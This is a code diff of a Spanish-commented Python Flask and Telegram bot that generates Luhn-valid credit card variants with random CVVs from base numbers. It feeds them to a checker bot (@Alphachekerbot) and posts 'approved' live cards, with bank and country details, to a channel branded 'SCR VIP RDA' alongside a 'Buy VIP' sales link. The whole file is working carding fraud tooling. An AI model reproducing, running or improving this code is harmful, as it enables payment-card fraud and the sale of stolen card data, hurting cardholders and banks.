@@ -4,7 +4,7 @@ import random
 import time
 import os
 from flask import Flask, render_template_string, request, jsonify
-from telethon import TelegramClient, events
+from telethon import TelegramClient, events, Button
 from telethon.errors import FloodWaitError, RPCError
 
 # ============ CONFIGURACIÓN ============
@@ -64,13 +64,13 @@ def generate_cc_variants(ccbase, count=10):
         cardnumber = ccbase
         month = '12'
         year = '25'
-    
+
     if len(cardnumber) < 12:
         return []
-    
+
     base_number = cardnumber[:-4]
     variants = []
-    
+
     attempts = 0
     while len(variants) < count and attempts < count * 3:
         attempts += 1
@@ -78,13 +78,13 @@ def generate_cc_variants(ccbase, count=10):
         partial_number = base_number + random_digits
         luhn_digit = generate_luhn_digit(partial_number)
         complete_number = partial_number + str(luhn_digit)
-        
+
         if luhn_checksum(complete_number) == 0:
             cvv = random.randint(100, 999)
             variant = f"{complete_number},{month},{year},{cvv}"
             if variant not in variants:
                 variants.append(variant)
-    
+
     return variants
 
 # ============ MANEJADOR DE EVENTOS ============
@@ -92,26 +92,88 @@ def generate_cc_variants(ccbase, count=10):
 async def response_handler(event):
     """Maneja respuestas de mensajes aprobados/rechazados"""
     global approved_count, declined_count, channelid
-    
+
     full_message = event.message.message if event.message.message else ""
     message_lower = full_message.lower()
-    
-    # Detectar emojis ✅ y ❌, y palabras "approved" o "declined" (case-insensitive)
+
+    # Detectar si es APPROVED
     if "✅" in full_message or "approved" in message_lower:
         approved_count += 1
         log_messages.append(f"✓ APPROVED: {full_message[:100]}")
-        
-        # ENVIAR AL CANAL SI ES APPROVED
+
+        # Extraer información del mensaje
+        lines = full_message.split('\n')
+        cc_number = status = response = country = bank = card_type = gate = ""
+
+        for line in lines:
+            if 'cc:' in line.lower():
+                cc_number = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
+            elif 'status:' in line.lower():
+                status = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
+            elif 'response:' in line.lower():
+                response = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
+            elif 'country:' in line.lower():
+                country = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
+            elif 'bank:' in line.lower():
+                bank = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
+            elif 'type:' in line.lower():
+                card_type = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
+            elif 'gate:' in line.lower():
+                gate = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
+
+        # Formato del mensaje
+        formatted_message = f"""
+╔═══════════════════════════╗
+       **SCR VIP RDA** 💳
+╚═══════════════════════════╝
+
+**⋄ ︱ CC:** `{cc_number}`
+**⋄ ︱ Status:** {status}
+**⋄ ︱ Response:** {response}
+- - - - - - - - - - - - - - -
+**⋄ ︱ Country:** {country}
+**⋄ ︱ Bank:** {bank}
+**⋄ ︱ Type:** {card_type}
+- - - - - - - - - - - - - - -
+**⋄ ︱ GATE:** {gate}
+
+**╔════════════════╗**
+    🔥 **BUY VIP** 🔥
+**╚════════════════╝**
+"""
+
+        # ENVIAR AL CANAL CON IMAGEN Y BOTÓN
         try:
-            await client.send_message(channelid, f"✅ **APROBADA**\n\n{full_message}")
-            log_messages.append(f"✓ Enviado al canal SCR VIP RDA")
+            # Ruta de la imagen (debe estar en el directorio del proyecto)
+            image_path = 'x1.jpg'
+
+            buttons = [Button.url('🔥 Buy VIP', 'https://t.me/rushnet')]
+
+            # Enviar con imagen si existe, si no, solo texto
+            if os.path.exists(image_path):
+                await client.send_file(
+                    channelid,
+                    image_path,
+                    caption=formatted_message,
+                    buttons=buttons,
+                    parse_mode='markdown'
+                )
+                log_messages.append(f"✓ Enviado al canal con imagen")
+            else:
+                await client.send_message(
+                    channelid, 
+                    formatted_message, 
+                    buttons=buttons,
+                    parse_mode='markdown'
+                )
+                log_messages.append(f"✓ Enviado al canal sin imagen (x1.jpg no encontrado)")
         except Exception as e:
-            log_messages.append(f"ERROR al enviar al canal: {e}")
-            
+            log_messages.append(f"ERROR al enviar: {e}")
+
     elif "❌" in full_message or "declined" in message_lower:
         declined_count += 1
         log_messages.append(f"✗ DECLINED: {full_message[:100]}")
-    
+
     # Mantener solo los últimos 100 logs
     if len(log_messages) > 100:
         log_messages.pop(0)
@@ -139,30 +201,30 @@ async def send_to_bot():
                 log_messages.append("INFO: ccs.txt no encontrado. Esperando...")
                 await asyncio.sleep(30)
                 continue
-            
+
             with open('ccs.txt', 'r', encoding='utf-8') as f:
                 ccs_list = f.readlines()
-            
+
             if ccs_list:
                 current_cc = ccs_list[0].strip()
-                
+
                 if len(ccs_list) > 1:
                     with open('ccs.txt', 'w', encoding='utf-8') as f:
                         f.writelines(ccs_list[1:])
                 else:
                     with open('ccs.txt', 'w', encoding='utf-8') as f:
                         f.write("")
-                
+
                 log_messages.append(f"INFO: Generando variantes para {current_cc[:12]}...")
                 cc_variants = generate_cc_variants(current_cc, 10)
-                
+
                 if not cc_variants:
                     log_messages.append(f"ERROR: No se pudieron generar variantes")
                     await asyncio.sleep(20)
                     continue
-                
+
                 commands = await load_commands()
-                
+
                 for i in range(0, len(cc_variants), 2):
                     pair = cc_variants[i:i+2]
                     for cc in pair:
@@ -176,12 +238,12 @@ async def send_to_bot():
                             await asyncio.sleep(e.seconds)
                         except RPCError as e:
                             log_messages.append(f"ERROR RPC: {e}")
-                    
+
                     await asyncio.sleep(21)
             else:
                 log_messages.append("INFO: No hay CCs. Esperando...")
                 await asyncio.sleep(20)
-        
+
         except Exception as e:
             log_messages.append(f"ERROR: {e}")
             await asyncio.sleep(20)
@@ -192,10 +254,10 @@ async def start_client():
         log_messages.append("INFO: Iniciando cliente de Telegram...")
         await client.start()
         log_messages.append("✓ Cliente autenticado correctamente")
-        
-        # Escuchar mensajes EDITADOS del bot checker (usa MessageEdited en lugar de NewMessage)
+
+        # Escuchar mensajes EDITADOS del bot checker
         client.add_event_handler(response_handler, events.MessageEdited(chats='@Alphachekerbot'))
-        
+
         await asyncio.gather(send_to_bot(), client.run_until_disconnected())
     except Exception as e:
         log_messages.append(f"ERROR: Error al iniciar cliente: {e}")
@@ -251,19 +313,19 @@ def index():
     </body>
     </html>
     '''
-    return render_template_string(html, log='\\n'.join(log_messages[-50:]), approved=approved_count, declined=declined_count)
+    return render_template_string(html, log='\n'.join(log_messages[-50:]), approved=approved_count, declined=declined_count)
 
 @app.route('/set_channel', methods=['POST'])
 def set_channel():
     """Cambia el canal de destino"""
     global channelid
     new_channel = request.form.get('channel')
-    
+
     try:
         channelid = int(new_channel)
     except ValueError:
         channelid = new_channel
-    
+
     log_messages.append(f"✓ Canal actualizado a {channelid}")
     return jsonify({"ok": True, "message": f"Canal actualizado a {channelid}"})
 
@@ -271,7 +333,7 @@ def set_channel():
 def get_logs():
     """Obtiene los logs actuales en JSON"""
     return jsonify({
-        "log": '\\n'.join(log_messages[-50:]), 
+        "log": '\n'.join(log_messages[-50:]), 
         "approved": approved_count, 
         "declined": declined_count
     })
@@ -288,6 +350,6 @@ if __name__ == '__main__':
     telethon_thread = threading.Thread(target=telethon_thread_fn, daemon=True)
     telethon_thread.start()
     time.sleep(2)
-    
+
     # Iniciar Flask
     app.run('0.0.0.0', PORT, debug=False)
